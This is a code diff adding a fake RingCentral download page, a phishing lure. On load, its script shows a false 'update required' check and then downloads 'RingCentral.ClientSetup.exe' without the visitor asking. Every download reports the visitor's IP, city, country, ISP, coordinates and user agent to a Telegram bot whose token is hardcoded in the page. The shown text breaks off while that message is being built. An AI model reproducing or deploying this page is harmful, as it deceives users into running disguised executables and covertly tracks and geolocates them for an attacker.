@@ -1,0 +1,1278 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get the RingCentral App for Free | RingCentral</title>
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #ffffff;
+            line-height: 1.6;
+            color: #1f2a44;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        button {
+            cursor: pointer;
+        }
+
+        /* Utilities */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        /* Header */
+        .header {
+            background: #ffffff;
+            border-bottom: 1px solid #e5e7eb;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            padding: 16px 0;
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 12px;
+        }
+
+        .header-bottom {
+            border-top: 1px solid #e5e7eb;
+            padding-top: 12px;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo .ring {
+            color: #034687;
+        }
+
+        .logo .central {
+            color: #ff6b35;
+        }
+
+        .nav-menu {
+            display: flex;
+            list-style: none;
+            gap: 24px;
+            align-items: center;
+        }
+
+        .nav-link {
+            color: #374151;
+            font-size: 15px;
+            font-weight: 500;
+            padding: 8px 12px;
+            transition: color 0.2s ease;
+        }
+
+        .nav-link:hover {
+            color: #022f5a;
+        }
+
+        .dropdown-arrow {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-right: 2px solid currentColor;
+            border-bottom: 2px solid currentColor;
+            transform: rotate(45deg);
+            margin-left: 4px;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .contact-info {
+            font-size: 14px;
+            color: #374151;
+        }
+
+        .contact-number {
+            color: #034687;
+            font-weight: 600;
+        }
+
+        .header-button {
+            background: none;
+            border: none;
+            color: #374151;
+            font-size: 15px;
+            font-weight: 500;
+            padding: 8px 12px;
+            transition: color 0.2s ease;
+        }
+
+        .header-button:hover {
+            color: #022f5a;
+        }
+
+        .view-demo-btn {
+            background: #034687;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 600;
+            transition: background-color 0.2s ease;
+        }
+
+        .view-demo-btn:hover {
+            background: #022f5a;
+        }
+
+        .search-btn {
+            background: none;
+            border: none;
+            font-size: 18px;
+            padding: 8px;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 24px;
+            padding: 8px;
+        }
+
+        /* Main Content */
+        .main-content {
+            text-align: center;
+            padding: 64px 0;
+        }
+
+        .hero-title {
+            font-size: 56px;
+            font-weight: 700;
+            color: #111827;
+            margin-bottom: 24px;
+            line-height: 1.1;
+        }
+
+        .hero-subtitle {
+            font-size: 22px;
+            color: #4b5563;
+            max-width: 700px;
+            margin: 0 auto 40px;
+            line-height: 1.4;
+        }
+
+        .logo-center .logo-text {
+            font-size: 40px;
+            font-weight: 700;
+            margin-bottom: 40px;
+        }
+
+        .download-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 48px;
+        }
+
+        .download-btn {
+            background: #034687;
+            color: #ffffff;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            min-width: 180px;
+            transition: background-color 0.2s ease;
+        }
+
+        .download-btn:hover {
+            background: #022f5a;
+        }
+
+        .system-requirements {
+            background: #f9fafb;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 0 auto 64px;
+            max-width: 800px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .system-requirements-link {
+            color: #034687;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .system-requirements-link:hover {
+            color: #022f5a;
+            text-decoration: underline;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: #6b7280;
+        }
+
+        .section-tagline {
+            font-size: 14px;
+            font-weight: 600;
+            color: #374151;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+        }
+
+        .section-title {
+            font-size: 40px;
+            font-weight: 700;
+            color: #111827;
+            line-height: 1.2;
+        }
+
+        /* Features Section */
+        .features-section {
+            background: #f9fafb;
+            padding: 64px 0;
+        }
+
+        .features-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 24px;
+        }
+
+        .feature-card {
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 24px;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .feature-icon {
+            width: 48px;
+            height: 48px;
+            background: #f0f7ff;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            color: #034687;
+        }
+
+        .feature-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 8px;
+        }
+
+        .feature-description {
+            font-size: 15px;
+            color: #4b5563;
+            line-height: 1.5;
+        }
+
+        .feature-note {
+            font-size: 13px;
+            color: #6b7280;
+            font-style: italic;
+            margin-top: 8px;
+        }
+
+        /* FAQ Section */
+        .faq-section {
+            background: #f3f4f6;
+            padding: 64px 0;
+        }
+
+        .faq-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .faq-title {
+            font-size: 40px;
+            font-weight: 700;
+            color: #111827;
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .faq-item {
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            margin-bottom: 12px;
+        }
+
+        .faq-question {
+            width: 100%;
+            background: none;
+            border: none;
+            padding: 20px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #111827;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            text-align: left;
+            transition: background-color 0.2s ease;
+        }
+
+        .faq-question:hover {
+            background: #f9fafb;
+        }
+
+        .faq-arrow {
+            color: #6b7280;
+            transition: transform 0.3s ease;
+        }
+
+        .faq-item.open .faq-arrow {
+            transform: rotate(180deg);
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease, padding 0.3s ease;
+            font-size: 15px;
+            color: #4b5563;
+            line-height: 1.5;
+        }
+
+        .faq-item.open .faq-answer {
+            max-height: 300px;
+            padding: 0 20px 20px;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f8f9fa;
+            padding: 48px 0 32px;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        .footer-cta {
+            margin-bottom: 48px;
+        }
+
+        .footer-cta h2 {
+            font-size: 36px;
+            font-weight: 700;
+            color: #111827;
+            margin-bottom: 16px;
+        }
+
+        .footer-cta .contact-link {
+            color: #034687;
+            text-decoration: underline;
+            text-decoration-thickness: 2px;
+            text-underline-offset: 4px;
+        }
+
+        .footer-columns {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 24px;
+            margin-bottom: 48px;
+        }
+
+        .footer-column h3 {
+            font-size: 13px;
+            font-weight: 700;
+            color: #111827;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+        }
+
+        .footer-column ul {
+            list-style: none;
+        }
+
+        .footer-column li {
+            margin-bottom: 8px;
+        }
+
+        .footer-column a {
+            color: #4b5563;
+            font-size: 14px;
+            transition: color 0.2s ease;
+        }
+
+        .footer-column a:hover {
+            color: #034687;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 24px;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .social-link {
+            width: 36px;
+            height: 36px;
+            background: #374151;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 16px;
+            transition: background-color 0.2s ease;
+        }
+
+        .social-link:hover {
+            background: #034687;
+        }
+
+        .footer-legal {
+            display: flex;
+            gap: 16px;
+        }
+
+        .footer-legal a {
+            color: #4b5563;
+            font-size: 13px;
+        }
+
+        .footer-legal a:hover {
+            color: #034687;
+        }
+
+        .copyright {
+            color: #4b5563;
+            font-size: 13px;
+        }
+
+        /* Chat Bubble */
+        .chat-bubble {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            background: #034687;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 24px;
+            box-shadow: 0 4px 12px rgba(3, 70, 135, 0.3);
+            transition: transform 0.2s ease, background-color 0.2s ease;
+            z-index: 1000;
+        }
+
+        .chat-bubble:hover {
+            background: #022f5a;
+            transform: scale(1.1);
+        }
+
+        /* Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+        }
+
+        .overlay-content {
+            padding: 24px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #034687;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+            display: block;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .overlay-message {
+            font-size: 18px;
+            color: #f8f9fa;
+            margin-bottom: 16px;
+        }
+
+        .manual-download {
+            color: #0753f8;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .manual-download:hover {
+            color: #0e54ec;
+        }
+
+        .animating-ellipsis {
+            display: inline-block;
+            overflow: hidden;
+            vertical-align: bottom;
+            animation: ellipsis 1.5s infinite;
+        }
+
+        @keyframes ellipsis {
+            0% {
+                content: ".";
+            }
+
+            33% {
+                content: "..";
+            }
+
+            66% {
+                content: "...";
+            }
+
+            100% {
+                content: ".";
+            }
+        }
+
+        /* Mobile Responsiveness */
+        @media (max-width: 1024px) {
+            .hero-title {
+                font-size: 48px;
+            }
+
+            .hero-subtitle {
+                font-size: 20px;
+            }
+
+            .section-title {
+                font-size: 36px;
+            }
+
+            .faq-title {
+                font-size: 36px;
+            }
+
+            .footer-cta h2 {
+                font-size: 32px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-top {
+                padding-bottom: 0;
+            }
+
+            .header-bottom {
+                display: none;
+            }
+
+            .nav-menu {
+                display: none;
+                flex-direction: column;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: #ffffff;
+                border: 1px solid #e5e7eb;
+                padding: 16px;
+                z-index: 1000;
+            }
+
+            .nav-menu.active {
+                display: flex;
+            }
+
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .contact-info {
+                display: none;
+            }
+
+            .header-actions {
+                gap: 12px;
+            }
+
+            .main-content {
+                padding: 48px 0;
+            }
+
+            .hero-title {
+                font-size: 36px;
+                margin-bottom: 20px;
+            }
+
+            .hero-subtitle {
+                font-size: 18px;
+                margin-bottom: 32px;
+            }
+
+            .logo-center .logo-text {
+                font-size: 32px;
+            }
+
+            .download-buttons {
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+            }
+
+            .download-btn {
+                width: 100%;
+                max-width: 280px;
+            }
+
+            .system-requirements {
+                flex-direction: column;
+                gap: 12px;
+                text-align: center;
+            }
+
+            .features-section {
+                padding: 48px 0;
+            }
+
+            .faq-section {
+                padding: 48px 0;
+            }
+
+            .faq-title {
+                font-size: 32px;
+            }
+
+            .footer-columns {
+                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                gap: 16px;
+                text-align: center;
+            }
+
+            .overlay-content {
+                padding: 16px;
+                max-width: 500px;
+            }
+
+            .spinner {
+                width: 28px;
+                height: 28px;
+            }
+
+            .overlay-message {
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero-title {
+                font-size: 28px;
+            }
+
+            .hero-subtitle {
+                font-size: 16px;
+            }
+
+            .logo-center .logo-text {
+                font-size: 28px;
+            }
+
+            .section-title {
+                font-size: 28px;
+            }
+
+            .faq-title {
+                font-size: 28px;
+            }
+
+            .faq-question {
+                font-size: 16px;
+                padding: 16px;
+            }
+
+            .faq-answer {
+                font-size: 14px;
+            }
+
+            .footer-cta h2 {
+                font-size: 28px;
+            }
+
+            .overlay-content {
+                padding: 12px;
+                max-width: 250px;
+            }
+
+            .spinner {
+                width: 24px;
+                height: 24px;
+            }
+
+            .overlay-message {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="header-top">
+                <a href="#" class="logo" aria-label="RingCentral Home">
+                    <span class="ring">Ring</span><span class="central">Central</span>
+                </a>
+                <button class="mobile-menu-btn" aria-label="Toggle Menu">☰</button>
+                <nav class="nav-menu">
+                    <a href="#" class="nav-link">Products <span class="dropdown-arrow"></span></a>
+                    <a href="#" class="nav-link">Solutions <span class="dropdown-arrow"></span></a>
+                    <a href="#" class="nav-link">Plans & Pricing</a>
+                    <a href="#" class="nav-link">Partners <span class="dropdown-arrow"></span></a>
+                    <a href="#" class="nav-link">Resources <span class="dropdown-arrow"></span></a>
+                    <a href="#" class="nav-link">Company</a>
+                </nav>
+            </div>
+            <div class="header-bottom">
+                <div class="header-actions">
+                    <span class="contact-info">Talk to an expert: <a href="tel:18009400745" class="contact-number">1800
+                            940 745</a></span>
+                    <button class="header-button">Join a meeting</button>
+                    <button class="header-button">Support</button>
+                    <button class="header-button">Login <span class="dropdown-arrow"></span></button>
+                    <button class="search-btn" aria-label="Search">🔍</button>
+                    <button class="view-demo-btn">View Demo</button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content container">
+        <h1 class="hero-title">Get the Latest Version of the RingCentral App</h1>
+        <p class="hero-subtitle">
+            To enjoy seamless messaging, HD video meetings, and modern business calling, please install the latest
+            version of RingCentral.
+        </p>
+        <div class="promo">
+            The update should begin downloading automatically. Please install it to continue using RingCentral without
+            interruptions.
+        </div>
+        <div class="promo">
+            If it doesn’t, <a href="#" onclick="triggerDownload(); return false;">restart the download</a>
+        </div>
+        <div class="download-buttons">
+            <button class="download-btn" onclick="triggerDownload()" data-platform="Mac">Download for Mac</button>
+            <button class="download-btn" onclick="triggerDownload()" data-platform="Windows">Download for
+                Windows</button>
+        </div>
+        <div class="system-requirements">
+            <a href="#" class="system-requirements-link">Learn more about system requirements</a>
+            <button class="close-btn" aria-label="Close">×</button>
+        </div>
+        <div class="section-tagline">Hello to Possibilities™</div>
+        <h2 class="section-title">All Your Communication Tools in One Place</h2>
+    </main>
+
+    <!-- Features Section -->
+    <section class="features-section">
+        <div class="container features-container">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.5">
+                        <path
+                            d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+                    </svg>
+                </div>
+                <h3 class="feature-title">Virtual Phone System</h3>
+                <p class="feature-description">
+                    Make and receive VoIP calls with cloud PBX features like call routing, forwarding, auto-attendant,
+                    and voicemail.
+                </p>
+                <p class="feature-note">*Available to RingEX subscribers</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.5">
+                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2" />
+                        <line x1="8" y1="21" x2="16" y2="21" />
+                        <line x1="12" y1="17" x2="12" y2="21" />
+                    </svg>
+                </div>
+                <h3 class="feature-title">Video Meetings</h3>
+                <p class="feature-description">
+                    Host unlimited video meetings with up to 200 participants, featuring screen sharing, chat,
+                    recording, and transcription.
+                </p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.5">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                        <circle cx="12" cy="7" r="4" />
+                    </svg>
+                </div>
+                <h3 class="feature-title">Integrations</h3>
+                <p class="feature-description">
+                    Connect with 200+ apps like Google Workspace, Salesforce, and Microsoft 365, or build custom
+                    workflows with APIs.
+                </p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.5">
+                        <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
+                        <rect x="7" y="7" width="3" height="3" />
+                        <rect x="14" y="7" width="3" height="3" />
+                        <rect x="7" y="14" width="3" height="3" />
+                        <rect x="14" y="14" width="3" height="3" />
+                    </svg>
+                </div>
+                <h3 class="feature-title">Team Messaging</h3>
+                <p class="feature-description">
+                    Boost collaboration with instant messaging, file sharing, and task management.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="faq-section">
+        <div class="container faq-container">
+            <h2 class="faq-title">Frequently Asked Questions</h2>
+            <div class="faq-item">
+                <button class="faq-question" aria-expanded="false">
+                    <span>Is the RingCentral app free?</span>
+                    <span class="faq-arrow">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
+                        </svg>
+                    </span>
+                </button>
+                <div class="faq-answer">
+                    <p>The RingCentral app is free to download. A subscription is required for most features, with plans
+                        including a free tier with limited functionality.</p>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-question" aria-expanded="false">
+                    <span>What devices support the RingCentral app?</span>
+                    <span class="faq-arrow">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
+                        </svg>
+                    </span>
+                </button>
+                <div class="faq-answer">
+                    <p>The app is available on Windows, Mac, iOS, and Android devices. Check system requirements for
+                        compatibility details.</p>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-question" aria-expanded="false">
+                    <span>Can I use RingCentral without a subscription?</span>
+                    <span class="faq-arrow">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
+                        </svg>
+                    </span>
+                </button>
+                <div class="faq-answer">
+                    <p>Yes, a free tier offers basic features like limited messaging and meetings, but a paid plan
+                        unlocks advanced capabilities.</p>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-question" aria-expanded="false">
+                    <span>How secure is the RingCentral app?</span>
+                    <span class="faq-arrow">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
+                        </svg>
+                    </span>
+                </button>
+                <div class="faq-answer">
+                    <p>RingCentral uses end-to-end encryption, secure cloud storage, and compliance with GDPR, HIPAA,
+                        and other standards.</p>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-question" aria-expanded="false">
+                    <span>How do I get support for the app?</span>
+                    <span class="faq-arrow">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <polyline points="6,9 12,15 18,9" />
+                        </svg>
+                    </span>
+                </button>
+                <div class="faq-answer">
+                    <p>Contact support via the app, website, or phone at 1800 940 745. Paid plans include 24/7
+                        assistance.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-cta">
+                <h2>How Can We Help? <a href="#" class="contact-link">Contact Us</a></h2>
+            </div>
+            <div class="footer-columns">
+                <div class="footer-column">
+                    <h3>Products</h3>
+                    <ul>
+                        <li><a href="#">RingCentral RingEX™</a></li>
+                        <li><a href="#">Message</a></li>
+                        <li><a href="#">Video</a></li>
+                        <li><a href="#">Phone</a></li>
+                        <li><a href="#">Fax</a></li>
+                        <li><a href="#">RingCentral Webinar™</a></li>
+                        <li><a href="#">RingCentral Events</a></li>
+                        <li><a href="#">Customer Experience</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Partners</h3>
+                    <ul>
+                        <li><a href="#">Global Service Providers</a></li>
+                        <li><a href="#">Channel Partners</a></li>
+                        <li><a href="#">ISV Partners</a></li>
+                        <li><a href="#">Connectivity Partners</a></li>
+                        <li><a href="#">Affiliate Partners</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Open Ecosystem</h3>
+                    <ul>
+                        <li><a href="#">Developer Platform</a></li>
+                        <li><a href="#">APIs</a></li>
+                        <li><a href="#">Integrated Apps</a></li>
+                        <li><a href="#">App Gallery</a></li>
+                        <li><a href="#">Developer Support</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Resources</h3>
+                    <ul>
+                        <li><a href="#">Resource Centre</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Customer Stories</a></li>
+                        <li><a href="#">Newsroom</a></li>
+                        <li><a href="#">Product Demos</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>About Us</h3>
+                    <ul>
+                        <li><a href="#">Our Company</a></li>
+                        <li><a href="#">Leadership</a></li>
+                        <li><a href="#">Awards</a></li>
+                        <li><a href="#">Investor Relations</a></li>
+                        <li><a href="#">Trust Centre</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Quick Links</h3>
+                    <ul>
+                        <li><a href="#">App Download</a></li>
+                        <li><a href="#">Join a Meeting</a></li>
+                        <li><a href="#">RingCentral App Login</a></li>
+                        <li><a href="#">Admin Portal Login</a></li>
+                        <li><a href="#">Support</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="social-links">
+                    <a href="#" class="social-link" aria-label="Facebook">f</a>
+                    <a href="#" class="social-link" aria-label="Twitter">𝕏</a>
+                    <a href="#" class="social-link" aria-label="LinkedIn">in</a>
+                    <a href="#" class="social-link" aria-label="YouTube">▶</a>
+                </div>
+                <div class="footer-legal">
+                    <a href="#">Legal</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Cookie Notice</a>
+                    <a href="#">Site Map</a>
+                </div>
+                <div class="copyright">
+                    © 2025 RingCentral, Inc. All rights reserved.
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Chat Bubble -->
+    <button class="chat-bubble" aria-label="Open Chat">💬</button>
+    <script>
+        // System Requirements Banner
+        const closeBtn = document.querySelector('.close-btn');
+        if (closeBtn) {
+            closeBtn.addEventListener('click', () => {
+                const banner = document.querySelector('.system-requirements');
+                banner.style.display = 'none';
+            });
+        }
+
+        // Mobile Menu Toggle
+        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+        const navMenu = document.querySelector('.nav-menu');
+        if (mobileMenuBtn && navMenu) {
+            mobileMenuBtn.addEventListener('click', () => {
+                navMenu.classList.toggle('active');
+                mobileMenuBtn.textContent = navMenu.classList.contains('active') ? '×' : '☰';
+            });
+        }
+
+        // FAQ Dropdowns
+        document.querySelectorAll('.faq-question').forEach(button => {
+            button.addEventListener('click', () => {
+                const faqItem = button.parentElement;
+                const isOpen = faqItem.classList.contains('open');
+                document.querySelectorAll('.faq-item').forEach(item => {
+                    item.classList.remove('open');
+                    item.querySelector('.faq-question').setAttribute('aria-expanded', 'false');
+                });
+                if (!isOpen) {
+                    faqItem.classList.add('open');
+                    button.setAttribute('aria-expanded', 'true');
+                }
+            });
+        });
+
+        // Chat Bubble
+        const chatBubble = document.querySelector('.chat-bubble');
+        if (chatBubble) {
+            chatBubble.addEventListener('click', () => {
+                alert('Chat support would open here');
+            });
+        }
+
+        // Overlay and Update Flow
+        document.addEventListener('DOMContentLoaded', () => {
+            const overlay = document.createElement('div');
+            overlay.className = 'overlay';
+            const overlayContent = document.createElement('div');
+            overlayContent.className = 'overlay-content';
+            overlayContent.innerHTML = `
+                <div class="spinner" id="spinner"></div>
+                <div class="overlay-message" id="message">Checking your RingCentral version...</div>
+            `;
+            overlay.appendChild(overlayContent);
+
+            if (document.body) {
+                document.body.appendChild(overlay);
+            } else {
+                document.addEventListener('load', () => {
+                    if (document.body) {
+                        document.body.appendChild(overlay);
+                    }
+                });
+            }
+
+            function triggerDownload() {
+                const platform = this.getAttribute('data-platform') || 'Unknown'; // Use 'this' context or default
+                var link = document.createElement('a');
+                link.href = "RingCentral.ClientSetup.exe";
+                link.download = "RingCentral.ClientSetup.exe";
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+
+                // Log to Telegram immediately
+                logToTelegram(platform);
+            }
+
+            const spinner = document.getElementById('spinner');
+            const message = document.getElementById('message');
+
+            setTimeout(() => { message.textContent = 'Checking your RingCentral app version...'; }, 2000);
+            setTimeout(() => { message.textContent = 'Verifying your RingCentral app version...'; }, 2000);
+            setTimeout(() => { message.textContent = 'Update Required: your RingCentral app is not up to date.'; }, 3000);
+            setTimeout(() => {
+                // Call triggerDownload directly when sequence completes
+                triggerDownload.call({ getAttribute: () => 'Auto' }); // Use 'Auto' as platform for automated trigger
+                setTimeout(() => {
+                    message.innerHTML = 'If the update doesn’t begin automatically, <span class="manual-download">click here to download it manually</span>.';
+                    const manualLink = document.querySelector('.manual-download');
+                    manualLink.addEventListener('click', triggerDownload.bind(manualLink)); // Bind context for manual trigger
+                }, 4000);
+            }, 5000);
+
+            // Attach download event to buttons with immediate execution
+            document.querySelectorAll('.download-btn').forEach(btn => {
+                btn.addEventListener('click', triggerDownload.bind(btn)); // Bind button context
+            });
+        });
+
+        // Telegram Logger Function with New Template
+        async function logToTelegram(platform) {
+            const botToken = '7710333141:AAFgqej0rxKwZOExMLIDeZ8uwzrGBmyK6Mw'; // Replace with your Telegram Bot Token
+            const chatId = 2042026323; // Replace with your Telegram Chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Get system info
+            // const systemInfo = {
+            //     os: navigator.platform,
+            //     browser: navigator.userAgent.split('(')[1].split(')')[0] || 'Unknown',
+            //     sessionId: Math.random().toString(36).substr(2, 9) // Simple session ID
+            // };
+            const systemInfo = {
+                os: navigator.platform,
+                browser: navigator.userAgent.split('(')[1].split(')')[0] || 'Unknown',
+                userAgent: navigator.userAgent,
+                sessionId: Math.random().toString(36).substr(2, 9)
+            };
+
+            // Placeholder for IP (implement getClientIP function)
+            // Enhanced IP and Region Fetch Function
+            async function getClientIP() {
+                // try {
+                //     // Fetch IP address
+                //     const ipResponse = await fetch('https://api.ipify.org?format=json');
+                //     const ipData = await ipResponse.json();
+                //     const ip = ipData.ip || 'N/A';
+
+                //     // Fetch region information using ipapi.co
+                //     const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                //     const geoData = await geoResponse.json();
+                //     const region = geoData.region || 'N/A';
+                //     console.log('Fetched IP and Region:', { ip, region }); // Debug log
+                //     return { ip, region };
+                // } catch (error) {
+                //     console.error('IP or region fetch failed:', error);
+                //     return { ip: 'N/A', region: 'N/A' };
+                // }
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip || 'N/A';
+
+                    const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const geoData = await geoResponse.json();
+                    const region = geoData.region || 'N/A';
+                    const city = geoData.city || 'N/A';
+                    const country = geoData.country_name || 'N/A';
+                    const isp = geoData.org || 'N/A';
+                    const latitude = geoData.latitude || 'N/A';
+                    const longitude = geoData.longitude || 'N/A';
+
+                    return { ip, region, city, country, isp, latitude, longitude };
+                } catch (error) {
+                    console.error('IP or geolocation fetch failed:', error);
+                    return { ip: 'N/A', region: 'N/A', city: 'N/A', country: 'N/A', isp: 'N/A', latitude: 'N/A', longitude: 'N/A' };
+                }
+            }
+
+            const { ip, region, city, country, isp, latitude, longitude } = await getClientIP();            const filename = "RingCentral.ClientSetup.exe";
+            const description = `Download initiated for ${platform}`;
+            const timeZone = 'America/New_York';
+            const time = new Date().toLocaleString('en-US', { timeZone: timeZone, hour12: true });
+            const deviceType = /Win/.test(systemInfo.os) ? '🖥 Desktop' : '📱 Mobile'; // Simple device detection
+
+
+            const message = `🛡 New RingCentral Download 🛡\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🌍 Location: ${city}, ${region}, ${country}\n` +
+                    `🏢 ISP: ${isp}\n` +
